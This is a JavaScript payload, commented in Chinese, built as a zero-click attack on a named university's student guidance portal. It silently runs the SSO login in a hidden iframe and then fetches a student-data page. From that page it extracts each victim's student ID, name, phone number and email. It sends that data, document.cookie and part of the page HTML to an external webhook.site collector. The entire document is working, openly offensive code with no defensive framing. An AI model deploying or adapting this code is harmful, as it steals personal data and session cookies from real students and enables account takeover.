(async () => {
    // === 1. 設定 ===
    const webhook = "https://webhook.site/14d34c64-9cd2-413f-acc2-1affb6bf3107";
    const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
    const targetUrl = "/GuidanceApp/Guidance_StudentDataStdtCtrl?Action=Page1BI";
    
    // === 2. 日誌工具 (繞過 CORS) ===
    const log = (msg) => {
        try { new Image().src = `${webhook}?log=${encodeURIComponent(msg)}&t=${Date.now()}`; } catch(e){}
    };

    log("Zero_Click_Start");

    // === 3. 注入隱藏 iframe 執行 SSO ===
    // 因為前面測試證實 SSO 頁面允許被 iframe 嵌入，所以我們可以在背景偷偷做
    const authFrame = document.createElement('iframe');
    authFrame.style.display = 'none';
    authFrame.src = ssoUrl;
    document.body.appendChild(authFrame);

    log("SSO_Frame_Injected");

    // === 4. 等待認證 (8秒) ===
    // 給予足夠時間讓 SSO 在背景跑完跳轉並寫入 Cookie
    await new Promise(r => setTimeout(r, 8000));

    log("Wait_Done_Fetching");

    // === 5. 抓取資料 ===
    try {
        // 使用 credentials: 'include' 確保帶上剛建立的 Session Cookie
        const response = await fetch(targetUrl, {credentials: 'include'});
        const html = await response.text();

        // === 6. 解析個資 ===
        const clean = (str) => str ? str.replace(/<[^>]+>/g, '').trim() : "N/A";
        // 嘗試從 HTML 中提取關鍵欄位
        let info = {
            studentId: clean(html.match(/學生學號:[\s\S]*?form-control-static">([^<]+)/)?.[1]),
            name: clean(html.match(/學生姓名:[\s\S]*?form-control-static">([^<]+)/)?.[1]),
            phone: clean(html.match(/手機:[\s\S]*?form-control-static">([^<]+)/)?.[1]),
            email: clean(html.match(/E-mail:[\s\S]*?form-control-static">([^<]+)/)?.[1]),
            // 判斷是否成功登入
            is_login_success: !html.includes("請由校務行政入口網登入")
        };

        // === 7. 回傳資料 ===
        const payload = JSON.stringify({
            status: "SUCCESS_ZERO_CLICK",
            victim_data: info,
            cookie_dump: document.cookie,
            // 預覽 HTML 前 10000 字，用來 debug
            html_preview: html.substring(0, 10000)
        });

        // 優先使用 sendBeacon (可靠性高)
        if (navigator.sendBeacon) {
            navigator.sendBeacon(webhook, payload);
        } else {
            // 回退使用 fetch (no-cors)
            fetch(webhook, {
                method: 'POST',
                mode: 'no-cors',
                headers: {'Content-Type': 'text/plain'},
                body: payload
            });
        }
        log("Data_Exfiltrated");

    } catch (e) {
        log("Fetch_Error_" + e.message);
    }

    // === 8. 清理 ===
    authFrame.remove();
})();